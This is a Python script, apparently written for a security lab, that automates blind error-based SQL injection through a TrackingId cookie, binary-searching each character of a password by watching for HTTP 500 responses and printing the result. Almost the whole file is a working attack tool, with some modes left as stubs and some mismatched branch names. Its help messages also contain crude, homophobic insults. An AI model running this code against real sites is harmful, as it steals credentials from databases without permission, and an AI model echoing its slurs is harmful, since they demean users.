import sys
import urllib3
import requests
import urllib.parse

#proxies = {"http" : "http://127.0.0.1:8000","https" : "http://127.0.0.1:8000"}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # To avoid wornings

def flag_sort ():

    if len(sys.argv) < 1 and sys.argv[1] in ('-h','--help'):
        print("[-] You need help? GAY")
        exit(1)

    if len(sys.argv) < 3:
        print("[-] Missing arguments, please use %s -h/--help" % sys.argv[0].rsplit("\\", 1)[-1])
        exit(1)

    match sys.argv[1]:
        case '-h' | '--help':
            print("Fuck you, GAY")
            exit(1)

        case '-l' | '--len':
            if sys.argv[2] == '-d':
                return 'len','Pass_len_scan.txt'
            return 'error',sys.argv[2]
        
        case '-e' | '--error':
            if sys.argv[2] == '-d':
                return 'error','Error_based_scan.txt'
            return 'error',sys.argv[2]
        
        case '-t' | '--time':#//////NEED TO SINISH LOJIC
            if sys.argv[2] == '-d':
                return 'time','Time_based_scan.txt'
            return 'time',sys.argv[2]
        case _:
            print("[-] ERROR: Invalid argument:" + sys.argv[1])
            exit(1)

def error_sqli_file_read (file_path):
    
    try:
        with open(file_path, 'r') as file:
            pass_len = 0
            url = ""
            for line in file:
                # Strip whitespace and check for variable names
                line = line.strip()

                match line.split(":", 1):
                    case ["URL", value]:
                        url = value.strip()
                    case ["Passsword size", value]:
                        pass_len = value.strip()
                    case ["TrackingId", value]:
                        traking_id = value.strip()
                    case ["session", value]:
                        session_id = value.strip()
                    case ["SQLi", value]:
                        sql_injection = value.strip()
                    case _:
                        continue
        
        return url,pass_len,sql_injection

    except FileNotFoundError:
        print(f"Error: The file '{file_path}' does not exist.")
        exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        exit(1)

def time_sqli_file_read(file_path):
    print("Time based sqli going on")

def pass_len_file_read(file_path):
    print("LOOKINF FOR PASS LEN FILE")

def sqli_force_pass_len(data):
   
    for i in range(1,20):
        sql_injection = data[4]
        print("tool "+sql_injection)
        sql_injection = sql_injection.replace('$a$',str(i),1)
        sql_payload_encoded = urllib.parse.quote(sql_injection)
        print("The password lenght is %s:" % i)
        cookies = {'TrackingId':data[2] + sql_payload_encoded,'session':data[3]}
        r = requests.get(data[0], cookies=cookies, verify=False)
        #print(sql_injection)
        if r.status_code == 500 :
            return i
        else:
            sys.stdout.write("\r" + chr(i))
            sys.stdout.flush()

def make_sql_payload(payload,i,sign,character):
    sql_payload = payload
    sql_payload = sql_payload.replace('$a$',i,1)
    sql_payload = sql_payload.replace('$a$',sign,1)
    sql_payload = sql_payload.replace('$a$',character,1)
    return urllib.parse.quote(sql_payload)

def sqli_force_pass(data):

    numbers = (range(48,58))
    chars = (range(97,124))

    #--------Making a get request, and reading the coonies---------#        
    pass_extracted = ""
    initial_request = requests.get(data[0], verify=False)
    session_cookie = initial_request.cookies.get('session')
    tracking_id = initial_request.cookies.get('TrackingId')
    if not session_cookie or not tracking_id:
        print("Error: Unable to fetch required cookies.")
        exit()

    for i in range(1,int(data[1])+1):

    #--------Changing the peyload, and make him URL like-----------#
        sql_payload_encoded = make_sql_payload(data[2],str(i),'<',chr(chars.start))
        cookies = {'TrackingId': tracking_id + sql_payload_encoded,'session': session_cookie}

    #--------Maaking a first request of the binary search-----------#
        r = requests.get(data[0], cookies=cookies, verify=False)
        if r.status_code == 500 :
            left = numbers.start
            right = numbers.stop-1
        else:
            left = chars.start
            right = chars.stop-1

            
        while left <= right:
            mid = left + (right - left) // 2

            # Generate SQL payload to check if the value is <= mid
            sql_payload_encoded = make_sql_payload(data[2], str(i), '<=', chr(mid))
            cookies = {'TrackingId': tracking_id + sql_payload_encoded, 'session': session_cookie}

            # Perform a single comparison
            r = requests.get(data[0], cookies=cookies, verify=False)
            sys.stdout.write(f"\rPassword:{pass_extracted}{chr(mid)}")
            sys.stdout.flush()
            if r.status_code == 500:
                # If <= mid, the target is <= mid
                right = mid - 1
            else:
                # If > mid, the target is > mid
                left = mid + 1

        # Ensure final confirmation with '='
        if left <= numbers.stop - 1 or left <= chars.stop - 1:
            sql_payload_encoded = make_sql_payload(data[2], str(i), '=', chr(left))
            cookies = {'TrackingId': tracking_id + sql_payload_encoded, 'session': session_cookie}
            r = requests.get(data[0], cookies=cookies, verify=False)

            if r.status_code == 500:
                pass_extracted += chr(left)
            else:
                print(f"\nError confirming character at position {i}")
                exit(1)   
    
    print("\n The password is: " + pass_extracted)

if __name__ == "__main__":
    flag = flag_sort()
    print("[+] Scanning %s" % flag[1])
    match flag[0]:
        case 'error':
            data = error_sqli_file_read(flag[1])
            print("[+] Estableshing connection with the targeted site")
            sqli_force_pass(data)
        case 'time':
            data = time_sqli_file_read(flag[1])
        case 'lenght':
            data = pass_len_file_read(flag[1])
    
else: 
    print("Fuck")